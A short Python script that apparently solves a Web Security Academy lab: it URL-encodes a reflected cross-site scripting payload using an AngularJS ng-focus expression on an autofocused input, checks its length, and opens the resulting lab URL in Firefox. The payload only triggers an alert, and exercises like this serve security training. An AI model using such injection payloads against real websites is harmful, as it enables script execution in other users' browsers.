from urllib.parse import quote
import os



base_url = 'https://ac381fa51e6f41c4c05830a100320022.web-security-academy.net/'
endpoint = '?search=1&'


payload = """
<input+autofocus+ng-focus="[1].map(alert)">
"""
assert len(payload) <= 70
payload = quote(payload)

url = base_url + endpoint + payload
print(url)
os.system(f'firefox -new-tab "{url}"')

